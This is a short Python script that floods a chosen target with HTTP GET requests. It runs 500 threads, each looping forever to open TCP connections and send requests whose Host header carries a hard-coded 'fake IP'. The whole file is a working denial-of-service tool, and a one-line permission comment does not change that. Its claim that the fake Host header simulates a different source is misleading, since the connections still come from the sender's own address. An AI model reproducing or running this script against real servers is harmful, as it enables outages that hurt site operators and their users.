import threading
import socket

# Enter the target IP or domain name (use a server you own or have permission to test)
target = ''

# Define the port to target (i.e. port 80 for HTTP)
port = 80

# Fake IP used in the Host header to simulate a different source
fake_ip = '168.32.58.15'

# Function to simulate sending HTTP requests
def attack():
    while True:
        # Create a new socket (IPv4, TCP)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target server
        s.connect((target, port))
        
        # Send a GET request with the target IP in the URL path
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        
        # Send the Host header with the fake IP
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        # Close the socket after sending the request
        s.close()

# Launch 500 threads to simulate concurrent requests
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()